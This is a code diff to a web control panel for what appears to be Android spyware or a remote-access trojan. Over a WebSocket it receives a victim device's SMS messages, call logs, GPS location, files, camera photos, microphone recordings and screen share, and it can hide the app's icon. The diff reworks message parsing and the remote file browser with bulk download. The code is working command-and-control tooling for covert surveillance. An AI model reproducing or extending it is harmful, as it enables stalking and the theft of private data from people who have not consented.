@@ -7,7 +7,7 @@
         /* ===== GLOBAL ===== */
         body{
             margin:0;
-            background:#f5f7fa;  /* light professional background */
+            background:#f5f7fa;
             font-family: 'Segoe UI', system-ui, sans-serif;
             display:flex;
             height:100vh;
@@ -24,62 +24,6 @@
             box-shadow:2px 0 5px rgba(0,0,0,0.02);
         }
 
-        /* File manager with checkboxes */
-.file-checkbox {
-    width: 18px;
-    height: 18px;
-    cursor: pointer;
-}
-.file-name {
-    cursor: pointer;
-    color: #1976ff;
-}
-.file-name:hover {
-    text-decoration: underline;
-}
-.file-actions {
-    margin-bottom: 15px;
-    display: flex;
-    gap: 8px;
-    align-items: center;
-}
-.file-actions button {
-    width: auto;
-    padding: 6px 12px;
-    background: white;
-    border: 1px solid #d0d9e2;
-    border-radius: 6px;
-    cursor: pointer;
-}
-.file-actions button:hover {
-    background: #1976ff;
-    color: white;
-}
-/* Location info overlay on map */
-.map-info {
-    position: absolute;
-    top: 10px;
-    left: 10px;
-    background: rgba(255,255,255,0.6);
-    padding: 8px 12px;
-    border-radius: 8px;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    font-size: 13px;
-    color: #1a2634;
-    z-index: 1000;
-    pointer-events: none;
-    border-left: 4px solid #1976ff;
-}
-.map-info div {
-    margin: 2px 0;
-}
-.map-info .coord {
-    font-weight: 600;
-}
-.map-info .addr {
-    color: #2c3e50;
-    font-style: italic;
-}
         .logo{
             font-size:20px;
             font-weight:600;
@@ -198,16 +142,51 @@
         }
 
         /* ===== FILE EXPLORER ===== */
+        .file-toolbar{
+            display:flex;
+            align-items:center;
+            margin-bottom:15px;
+            gap:8px;
+            flex-wrap:wrap;
+        }
+        .file-toolbar button{
+            width:auto;
+            padding:6px 12px;
+            background:white;
+            border:1px solid #d0d9e2;
+            border-radius:6px;
+            cursor:pointer;
+            font-size:13px;
+        }
+        .file-toolbar button:hover{
+            background:#1976ff;
+            color:white;
+        }
+        .file-path{
+            background:#f0f2f5;
+            padding:6px 12px;
+            border-radius:20px;
+            font-size:13px;
+            color:#2c3e50;
+            flex:1;
+        }
+        .file-list{
+            border-top:1px solid #eef2f5;
+        }
         .file-item{
             display:flex;
             align-items:center;
-            padding:10px 12px;
+            padding:8px 12px;
             border-bottom:1px solid #eef2f5;
-            cursor:pointer;
-            gap:10px;
+            gap:8px;
         }
         .file-item:hover{
             background:#f5f9ff;
+        }
+        .file-checkbox{
+            width:18px;
+            height:18px;
+            cursor:pointer;
         }
         .file-icon{
             font-size:18px;
@@ -217,11 +196,32 @@
         .file-name{
             flex:1;
             color:#1a2634;
+            cursor:pointer;
+        }
+        .file-name.folder:hover{
+            text-decoration:underline;
         }
         .file-size{
             color:#7b8a9b;
             font-size:13px;
             margin-right:15px;
+        }
+        .download-selected{
+            margin-top:15px;
+            text-align:right;
+        }
+        .download-selected button{
+            width:auto;
+            padding:8px 16px;
+            background:#1976ff;
+            color:white;
+            border:none;
+            border-radius:6px;
+            cursor:pointer;
+            font-weight:500;
+        }
+        .download-selected button:hover{
+            background:#0d5bca;
         }
 
         /* ===== PAGINATION ===== */
@@ -313,6 +313,8 @@
     let currentData = [];               // for pagination
     let currentPage = 0;
     let dataType = null;                // 'sms', 'call', 'file'
+    let currentPath = "root";           // current directory for file manager
+    let selectedFiles = [];              // paths of selected files for download
 
     // Toggle states
     let screenActive = false;
@@ -323,7 +325,7 @@
 
     const panel = document.getElementById('main-panel');
 
-    // ---------- CONNECTION ----------
+    // ---------- CONNECTION (with dual message handling) ----------
     function connect() {
         ws = new WebSocket(WS_URL);
         ws.onopen = () => {
@@ -335,103 +337,14 @@
             const msg = e.data;
             console.log('Received:', msg);
 
-            // Status
-            if (msg.startsWith("STATUS:")) {
-                setStatus(msg.substring(7));
-            }
-            // GPS
-            else if (msg.startsWith("LOC_DATA:")) {
-                try {
-                    const data = JSON.parse(msg.substring(9));
-                    renderMap(data);
-                } catch (err) {
-                    console.error(err);
-                }
-            }
-            // File list
-            else if (msg.startsWith("FILE_LIST:")) {
-                try {
-                    currentData = JSON.parse(msg.substring(10));
-                    dataType = 'file';
-                    renderFiles();
-                } catch (err) {
-                    console.error(err);
-                }
-            }
-            // SMS
-            else if (msg.startsWith("SMS_DATA:")) {
-                try {
-                    currentData = JSON.parse(msg.substring(9));
-                    dataType = 'sms';
-                    renderTable();
-                } catch (err) {
-                    console.error(err);
-                }
-            }
-            // Call logs
-            else if (msg.startsWith("CALL_DATA:")) {
-                try {
-                    currentData = JSON.parse(msg.substring(10));
-                    dataType = 'call';
-                    renderTable();
-                } catch (err) {
-                    console.error(err);
-                }
-            }
-            // Camera image
-            else if (msg.startsWith("CAMERA_IMAGE:")) {
-                const base64 = msg.substring(13);
-                showImage(base64);
-            }
-            // Audio file
-            else if (msg.startsWith("AUDIO_RECORDING:")) {
-                const base64 = msg.substring(16);
-                showAudio(base64);
-            }
-            else if (msg.startsWith("AUDIO_STARTED")) {
-                micActive = true;
-                document.getElementById('micBtn').innerText = 'Stop Mic';
-                showNotification('Mic started');
-            }
-            else if (msg.startsWith("AUDIO_STOPPED")) {
-                micActive = false;
-                document.getElementById('micBtn').innerText = 'Start Mic';
-                showNotification('Mic stopped');
-            }
-            // Screen share
-            else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
-                screenActive = true;
-                document.getElementById('screenBtn').innerText = 'Stop Screen';
-                showNotification('Screen share started');
-            }
-            else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
-                screenActive = false;
-                document.getElementById('screenBtn').innerText = 'Start Screen';
-                if (pc) { pc.close(); pc = null; }
-                showNotification('Screen share stopped');
-            }
-            else if (msg.startsWith("RTC_OFFER:screen:")) {
-                handleOffer(msg.substring(17));
-            }
-            else if (msg.startsWith("ICE_CANDIDATE:")) {
-                handleIceCandidate(msg.substring(14));
-            }
-            // App icon
-            else if (msg.startsWith("APP_HIDDEN")) {
-                iconHidden = true;
-                document.getElementById('iconBtn').innerText = 'Show Icon';
-            }
-            else if (msg.startsWith("APP_SHOWN")) {
-                iconHidden = false;
-                document.getElementById('iconBtn').innerText = 'Hide Icon';
-            }
-            // Vibration
-            else if (msg.startsWith("VIBRATE_DONE")) {
-                showNotification('Vibration done');
-            }
-            // Error
-            else if (msg.startsWith("ERROR:")) {
-                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
+            // Try to parse as JSON first
+            try {
+                const json = JSON.parse(msg);
+                handleJSON(json);
+                return;
+            } catch (err) {
+                // Not JSON – fallback to plain text
+                handlePlainText(msg);
             }
         };
         ws.onclose = () => {
@@ -439,6 +352,152 @@
             setTimeout(connect, 5000);
         };
         ws.onerror = console.error;
+    }
+
+    // ---------- JSON HANDLER ----------
+    function handleJSON(json) {
+        switch (json.type) {
+            case 'SMS_DATA':
+                dataType = 'sms';
+                currentData = json.data;
+                renderTable();
+                break;
+            case 'CALL_LOGS':
+                dataType = 'call';
+                currentData = json.data;
+                renderTable();
+                break;
+            case 'FILE_LIST':
+                dataType = 'file';
+                currentData = json.data;
+                renderFiles();
+                break;
+            case 'LOCATION_UPDATE':
+                renderMap(json.data);
+                break;
+            case 'CAMERA_IMAGE':
+                showImage(json.data);
+                break;
+            case 'AUDIO_RECORDING':
+                showAudio(json.data);
+                break;
+            case 'ERROR':
+                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
+                break;
+            case 'DEVICE_STATUS':
+                setStatus(json.status);
+                break;
+            case 'APP_HIDDEN':
+                iconHidden = true;
+                document.getElementById('iconBtn').innerText = 'Show Icon';
+                showNotification('App icon hidden');
+                break;
+            case 'APP_SHOWN':
+                iconHidden = false;
+                document.getElementById('iconBtn').innerText = 'Hide Icon';
+                showNotification('App icon shown');
+                break;
+            case 'AUDIO_RECORDING_STARTED':
+                micActive = true;
+                document.getElementById('micBtn').innerText = 'Stop Mic';
+                showNotification('Mic started');
+                break;
+            case 'AUDIO_RECORDING_STOPPED':
+                micActive = false;
+                document.getElementById('micBtn').innerText = 'Start Mic';
+                showNotification('Mic stopped');
+                break;
+            case 'SCREEN_SHARE_STARTED':
+                screenActive = true;
+                document.getElementById('screenBtn').innerText = 'Stop Screen';
+                showNotification('Screen share started');
+                break;
+            case 'SCREEN_SHARE_STOPPED':
+                screenActive = false;
+                document.getElementById('screenBtn').innerText = 'Start Screen';
+                if (pc) { pc.close(); pc = null; }
+                showNotification('Screen share stopped');
+                break;
+            default:
+                console.log('Unhandled JSON type:', json.type);
+        }
+    }
+
+    // ---------- PLAIN TEXT HANDLER (legacy) ----------
+    function handlePlainText(msg) {
+        if (msg.startsWith("STATUS:")) {
+            setStatus(msg.substring(7));
+        } else if (msg.startsWith("LOC_DATA:")) {
+            try {
+                const data = JSON.parse(msg.substring(9));
+                renderMap(data);
+            } catch (err) {
+                console.error(err);
+            }
+        } else if (msg.startsWith("FILE_LIST:")) {
+            try {
+                currentData = JSON.parse(msg.substring(10));
+                dataType = 'file';
+                renderFiles();
+            } catch (err) {
+                console.error(err);
+            }
+        } else if (msg.startsWith("SMS_DATA:")) {
+            try {
+                currentData = JSON.parse(msg.substring(9));
+                dataType = 'sms';
+                renderTable();
+            } catch (err) {
+                console.error(err);
+            }
+        } else if (msg.startsWith("CALL_DATA:")) {
+            try {
+                currentData = JSON.parse(msg.substring(10));
+                dataType = 'call';
+                renderTable();
+            } catch (err) {
+                console.error(err);
+            }
+        } else if (msg.startsWith("CAMERA_IMAGE:")) {
+            showImage(msg.substring(13));
+        } else if (msg.startsWith("AUDIO_RECORDING:")) {
+            showAudio(msg.substring(16));
+        } else if (msg.startsWith("AUDIO_STARTED")) {
+            micActive = true;
+            document.getElementById('micBtn').innerText = 'Stop Mic';
+            showNotification('Mic started');
+        } else if (msg.startsWith("AUDIO_STOPPED")) {
+            micActive = false;
+            document.getElementById('micBtn').innerText = 'Start Mic';
+            showNotification('Mic stopped');
+        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
+            screenActive = true;
+            document.getElementById('screenBtn').innerText = 'Stop Screen';
+            showNotification('Screen share started');
+        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
+            screenActive = false;
+            document.getElementById('screenBtn').innerText = 'Start Screen';
+            if (pc) { pc.close(); pc = null; }
+            showNotification('Screen share stopped');
+        } else if (msg.startsWith("RTC_OFFER:screen:")) {
+            handleOffer(msg.substring(17));
+        } else if (msg.startsWith("ICE_CANDIDATE:")) {
+            handleIceCandidate(msg.substring(14));
+        } else if (msg.startsWith("APP_HIDDEN")) {
+            iconHidden = true;
+            document.getElementById('iconBtn').innerText = 'Show Icon';
+            showNotification('App icon hidden');
+        } else if (msg.startsWith("APP_SHOWN")) {
+            iconHidden = false;
+            document.getElementById('iconBtn').innerText = 'Hide Icon';
+            showNotification('App icon shown');
+        } else if (msg.startsWith("VIBRATE_DONE")) {
+            showNotification('Vibration done');
+        } else if (msg.startsWith("ERROR:")) {
+            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
+        } else {
+            console.log('Unhandled plain text:', msg);
+        }
     }
 
     function setStatus(s) {
@@ -471,7 +530,6 @@
             send('camFront');
             frontCamActive = true;
             document.getElementById('frontCamBtn').innerText = 'Stop Front';
-            // Auto revert after 5s (camera stops after one shot)
             setTimeout(() => {
                 if (frontCamActive) {
                     frontCamActive = false;
@@ -511,58 +569,33 @@
     // ---------- RENDERERS ----------
     function showImage(base64) {
         panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
+        frontCamActive = false;
+        backCamActive = false;
+        document.getElementById('frontCamBtn').innerText = 'Front Camera';
+        document.getElementById('backCamBtn').innerText = 'Back Camera';
     }
 
     function showAudio(base64) {
         panel.innerHTML = `
             <audio controls src="data:audio/3gp;base64,${base64}"></audio>
-            <button onclick="download('${base64}', 'recording.3gp')">Download</button>
+            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
         `;
     }
 
-    function download(b64, name) {
+    function downloadBase64(b64, name) {
         const a = document.createElement('a');
         a.href = 'data:application/octet-stream;base64,' + b64;
         a.download = name;
         a.click();
     }
 
-   function renderMap(loc) {
-    // Create map container with relative positioning for overlay
-    panel.innerHTML = '<div id="map" style="position:relative;"></div>';
-    const mapDiv = document.getElementById('map');
-
-    // Create info overlay
-    const infoDiv = document.createElement('div');
-    infoDiv.className = 'map-info';
-    infoDiv.innerHTML = `
-        <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
-        <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
-        <div>📡 Provider: ${loc.provider || 'unknown'}</div>
-        <div class="addr">🌍 Loading address...</div>
-    `;
-    mapDiv.appendChild(infoDiv);
-
-    // Initialize map
-    if (mapInstance) mapInstance.remove();
-    mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-    L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
-
-    // Fetch human-readable address using Nominatim (OpenStreetMap)
-    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
-        headers: { 'User-Agent': 'SystemSync-Console/1.0' }  // Identify your app
-    })
-    .then(response => response.json())
-    .then(data => {
-        const address = data.display_name || 'Address not found';
-        infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
-    })
-    .catch(err => {
-        console.error('Geocoding error:', err);
-        infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
-    });
-}
+    function renderMap(loc) {
+        panel.innerHTML = '<div id="map"></div>';
+        if (mapInstance) mapInstance.remove();
+        mapInstance = L.map('map').setView([loc.lat, loc.lon], 18);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+        L.circle([loc.lat, loc.lon], { radius: loc.acc || loc.accuracy, color: '#1976ff' }).addTo(mapInstance);
+    }
 
     // Table render with pagination
     function renderTable() {
@@ -571,7 +604,7 @@
             return;
         }
 
-        // Prepare columns based on dataType
+        // Prepare columns based on dataType (no timestamp formatting)
         let headers = [];
         let rows = [];
 
@@ -585,15 +618,14 @@
                 item.number,
                 item.name || '',
                 item.date,
-                item.duration + 's'   // keep raw duration
+                item.duration + 's'
             ]);
         } else {
-            // fallback
             panel.innerHTML = '<p>Unknown data type</p>';
             return;
         }
 
-        const pageSize = 17;
+        const pageSize = 20;
         const totalPages = Math.ceil(rows.length / pageSize);
         const start = currentPage * pageSize;
         const pageRows = rows.slice(start, start + pageSize);
@@ -625,115 +657,123 @@
         currentPage = p;
         renderTable();
     }
-// Global variables for file selection
-let selectedFiles = [];
 
-function renderFiles() {
-    if (!currentData || currentData.length === 0) {
-        panel.innerHTML = '<p>No files found. Make sure storage permission is granted and the directory is not empty.</p>';
-        return;
-    }
+    // ---------- FILE EXPLORER with checkboxes and download selected ----------
+    function renderFiles() {
+        if (!currentData || currentData.length === 0) {
+            panel.innerHTML = '<p>No files found. Make sure storage permission is granted.</p>';
+            return;
+        }
 
-    let html = `
-        <div class="file-actions">
-            <button onclick="selectAllFiles()">Select All</button>
-            <button onclick="deselectAllFiles()">Deselect All</button>
-            <button onclick="downloadSelected()" style="background:#1976ff; color:white;">Download Selected</button>
-        </div>
-        <table>
-            <thead>
-                <tr>
-                    <th style="width:30px;"><input type="checkbox" id="selectAllCheckbox" onchange="toggleSelectAll(this.checked)"></th>
-                    <th></th>
-                    <th>Name</th>
-                    <th>Size</th>
-                    <th>Modified</th>
-                </tr>
-            </thead>
-            <tbody>
-    `;
+        // Reset selected files when new directory loads
+        selectedFiles = [];
 
-    currentData.forEach(f => {
-        const isDir = f.isDir;
-        const path = f.path.replace(/'/g, "\\'"); // escape single quotes for onclick
-        const name = f.name;
-        const size = isDir ? '' : formatBytes(f.size);
-        const modified = f.lastModified || '';
-        html += `
-            <tr>
-                <td><input type="checkbox" class="file-checkbox" data-path="${path}" data-isdir="${isDir}" onchange="updateSelected(this)"></td>
-                <td>${isDir ? '📁' : '📄'}</td>
-                <td><span class="file-name" onclick="${isDir ? `navigateTo('${path}')` : ''}">${name}</span></td>
-                <td>${size}</td>
-                <td>${modified}</td>
-            </tr>
+        let html = `
+            <div class="file-toolbar">
+                <button onclick="navigateUp()">⬆ Up</button>
+                <span class="file-path">${currentPath}</span>
+                <button onclick="selectAllFiles()">Select All</button>
+                <button onclick="deselectAllFiles()">Deselect All</button>
+            </div>
+            <div class="file-list">
         `;
-    });
 
-    html += '</tbody></table>';
-    panel.innerHTML = html;
-    selectedFiles = [];
-    document.getElementById('selectAllCheckbox').checked = false;
-}
+        currentData.forEach(f => {
+            const isFolder = f.isDir;
+            const path = f.path;
+            const name = f.name;
+            const size = isFolder ? '' : formatBytes(f.size);
+            // Only files get checkboxes
+            const checkbox = isFolder ? '' : `<input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">`;
+            // Folders are clickable for navigation; files are not clickable (checkbox only)
+            const nameDisplay = isFolder
+                ? `<span class="file-name folder" onclick="handleFolderClick('${path}')">${name}</span>`
+                : `<span class="file-name">${name}</span>`;
 
-// Navigation function (global)
-window.navigateTo = function(path) {
-    send('ls ' + path);
-};
+            html += `
+                <div class="file-item">
+                    ${checkbox}
+                    <span class="file-icon">${isFolder ? '📁' : '📄'}</span>
+                    ${nameDisplay}
+                    <span class="file-size">${size}</span>
+                </div>
+            `;
+        });
 
-// Update selected files array when checkbox changes
-window.updateSelected = function(checkbox) {
-    const path = checkbox.dataset.path;
-    const isDir = checkbox.dataset.isdir === 'true';
-    if (checkbox.checked) {
-        if (!isDir && !selectedFiles.includes(path)) {
-            selectedFiles.push(path);
-        }
-    } else {
-        selectedFiles = selectedFiles.filter(p => p !== path);
+        html += `</div>`;
+
+        // Download Selected button
+        html += `
+            <div class="download-selected">
+                <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
+            </div>
+        `;
+
+        panel.innerHTML = html;
     }
-    // Update select all checkbox state
-    const checkboxes = document.querySelectorAll('.file-checkbox');
-    const allFileCheckboxes = Array.from(checkboxes).filter(cb => cb.dataset.isdir !== 'true');
-    const allChecked = allFileCheckboxes.length > 0 && allFileCheckboxes.every(cb => cb.checked);
-    document.getElementById('selectAllCheckbox').checked = allChecked;
-};
 
-// Toggle all file checkboxes
-window.toggleSelectAll = function(checked) {
-    const checkboxes = document.querySelectorAll('.file-checkbox');
-    checkboxes.forEach(cb => {
-        if (cb.dataset.isdir !== 'true') {
-            cb.checked = checked;
+    // Handle folder click (navigate)
+    window.handleFolderClick = function(path) {
+        currentPath = path;
+        send('ls ' + path);
+    };
+
+    // Navigate up
+    function navigateUp() {
+        if (currentPath === 'root' || currentPath === '') return;
+        let parts = currentPath.split('/');
+        parts.pop();
+        let parent = parts.join('/');
+        if (parent === '') parent = 'root';
+        currentPath = parent;
+        send('ls ' + parent);
+    }
+
+    // Update selected files array
+    window.updateSelected = function(checkbox) {
+        const path = checkbox.dataset.path;
+        if (checkbox.checked) {
+            if (!selectedFiles.includes(path)) {
+                selectedFiles.push(path);
+            }
+        } else {
+            selectedFiles = selectedFiles.filter(p => p !== path);
+        }
+        // Update the button count
+        const downloadBtn = document.querySelector('.download-selected button');
+        if (downloadBtn) {
+            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
+        }
+    };
+
+    // Select all files (only files, not folders)
+    function selectAllFiles() {
+        const checkboxes = document.querySelectorAll('.file-checkbox');
+        checkboxes.forEach(cb => {
+            cb.checked = true;
             updateSelected(cb);
-        }
-    });
-};
-
-window.selectAllFiles = function() {
-    toggleSelectAll(true);
-};
-
-window.deselectAllFiles = function() {
-    toggleSelectAll(false);
-};
-
-// Download all selected files
-window.downloadSelected = function() {
-    if (selectedFiles.length === 0) {
-        alert('No files selected');
-        return;
+        });
     }
-    selectedFiles.forEach(path => {
-        send('dl ' + path);
-    });
-    // Optionally clear selection after download
-    // deselectAllFiles();
-};
 
-    function handleFile(path, isDir) {
-        if (isDir) send('ls ' + path);
-        else send('dl ' + path);
+    function deselectAllFiles() {
+        const checkboxes = document.querySelectorAll('.file-checkbox');
+        checkboxes.forEach(cb => {
+            cb.checked = false;
+            updateSelected(cb);
+        });
+    }
+
+    // Download selected files
+    function downloadSelected() {
+        if (selectedFiles.length === 0) {
+            alert('No files selected');
+            return;
+        }
+        selectedFiles.forEach(path => {
+            send('dl ' + path);
+        });
+        // Optionally, you could clear selection after download
+        // deselectAllFiles();
     }
 
     function formatBytes(b) {
@@ -781,6 +821,3 @@ window.downloadSelected = function() {
 </script>
 </body>
 </html>
-
-
-
